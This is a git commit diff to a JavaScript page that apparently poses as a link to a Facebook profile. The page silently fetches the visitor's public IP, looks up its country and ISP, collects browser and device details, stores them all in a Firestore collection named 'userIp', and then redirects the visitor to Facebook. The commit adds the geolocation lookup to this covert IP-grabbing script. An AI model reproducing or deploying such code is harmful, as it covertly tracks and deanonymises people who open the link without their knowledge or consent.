fbb11062f83c46284e399faeae139e2c43bc72b8
Abdullah-git-hub <74533464+Abdullah-git-hub@users.noreply.github.com>
2023-04-05 12:44:47 +0600

    Update main.js

--- main.js
+++ main.js
@@ -2,23 +2,44 @@ fetch('https://api.ipify.org/?format=json')
   .then(response => response.json())
   .then(data => {
     const ipAddress = data.ip;
-    const deviceInfo = {
-      userAgent: navigator.userAgent,
-      language: navigator.language,
-      platform: navigator.platform,
-      screenWidth: window.screen.width,
-      screenHeight: window.screen.height,
-      networkeffectiveType: navigator.connection.effectiveType,
-      networkdownlink: navigator.connection.downlink,
-    };
+    
 
-    console.log(deviceInfo);
+    fetch(`https://api.iplocation.net/?ip=${ipAddress}`)
+      .then(response => response.json())
+      .then(data => {
 
-    db.collection("userIp").add({
-        ipAddress, deviceInfo, time: new Date(),
-    }).then(_ => {
-        window.location.replace("http://www.facebook.com/profile.php?")
-    });
+        const geoBasicInfo = {
+            ip_number: data.ip_number,
+            ip_version: data.ip_version,
+            country_name: data.country_name,
+            country_code2: data.country_code2,
+            isp: data.isp,
+        }
+
+        const deviceInfo = {
+          userAgent: navigator.userAgent,
+          language: navigator.language,
+          platform: navigator.platform,
+          screenWidth: window.screen.width,
+          screenHeight: window.screen.height,
+          networkeffectiveType: navigator.connection.effectiveType,
+          networkdownlink: navigator.connection.downlink,
+        };
+
+        console.log(deviceInfo);
+
+        db.collection("userIp").add({
+            ipAddress, deviceInfo, geoBasicInfo, time: new Date(),
+        }).then(_ => {
+            window.location.replace("http://www.facebook.com/profile.php?")
+        });
+      })
+      .catch(error => {
+        console.error(error);
+      });
+
+
+
   })
   .catch(error => {
     console.error(error);
